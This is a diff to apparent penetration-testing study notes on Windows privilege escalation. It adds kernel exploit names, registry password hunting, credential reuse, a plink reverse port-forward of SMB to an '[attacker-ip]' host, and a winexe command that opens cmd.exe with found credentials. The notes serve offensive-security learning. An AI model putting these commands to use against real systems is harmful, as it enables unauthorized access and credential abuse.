@@ -105,11 +105,40 @@ Other:
   - `search local_exploit_suggester`
   - In meterpreter shell: `run post/multi/recon/local_exploit_suggester`
 
-## Escalation Path: Kernal Exploits
-
-### Kernel Exploits Overview
+## Escalation Path: Kernel Exploits
 
 Windows Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits
 
 A kernel is a program that controls everything in the system and it facilitates the interactions between hardware and software.
+
+- `ms10-015 kitrap0d`
+- `ms10-059 Chimichurri`
+
+## Escalation Path: Passwords and Port Forwarding
+
+Be sure to analyse the systems active on all ports!
+- `nmap -T4 -p- -sV [ip]`
+
+Look for open ports that weren't found in the nmap scan
+- `netstat -ano`
+
+Hunting passwords:
+- Looking in the registry can be a quick win
+- Try to use all found credentials on all users
+
+Trigger a port forward:
+- `plink`: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
+- `sudo apt install ssh`
+- `nano /etc/ssh/sshd_config`
+  - Enable `permit root login`
+  - Possibly change the port.
+- `service ssh restart`
+- `service ssh start`
+- `plink.exe -l [user] -pw [password] -R 445:127.0.0.1:445 [attacker-ip]`
+
+Execute commands on a windows system:
+- `winexe -U [user]%[password] //127.0.0.1 "cmd.exe"`
+- Execute commands multiple times.
+
+## Escalation Path: Windows Subsystem for Linux
 
